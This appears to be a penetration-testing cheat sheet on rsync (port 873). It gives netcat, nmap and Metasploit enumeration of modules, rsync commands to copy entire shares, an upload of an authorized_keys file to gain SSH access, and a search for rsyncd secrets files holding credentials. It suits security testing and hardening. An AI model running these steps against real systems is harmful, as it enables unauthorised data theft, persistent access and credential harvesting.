873 - Pentesting Rsync
Basic Information

    rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.[3] It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression,[3] and SSH or stunnel can be used for security.

From wikipedia.

Default port: 837

PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack

Enumeration
Banner & Manual communication

nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection
​
​
#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password

Enumerate shared folders

An rsync module is essentially a directory share. These modules can optionally be protected by a password. This options lists the available modules and, optionally, determines if the module requires a password to access:

nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list
​
#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730

Notice that it could be configured a shared name to not be listed. So there could be something hidden.
Notice that it may be some shared names being listed where you need some (different) credentials to access. So, not always all the listed names are going to be accessible and you will notice it if you receive an "Access Denied" message when trying to access some of those.
​Brute force​
Manual Rsync

Once you have the list of modules you have a few different options depending on the actions you want to take and whether or not authentication is required. If authentication is not required you can list a shared folder:

rsync -av --list-only rsync://192.168.0.123/shared_name

And copy all files to your local machine via the following command:

rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared

This recursively transfers all files from the directory <shared_name> on the machine <IP>into the ./rsync_shared directory on the local machine. The files are transferred in "archive" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.

If you have credentials you can list/download a shared name using (the password will be prompted):

rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared

You could also upload some content using rsync (for example, in this case we can upload an authorized_keys file to obtain access to the box):

rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh

POST

Find the rsyncd configuration file:

find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)

Inside the config file sometimes you could find the parameter secrets file = /path/to/file and this file could contains usernames and passwords allowed to authenticate to rsyncd.
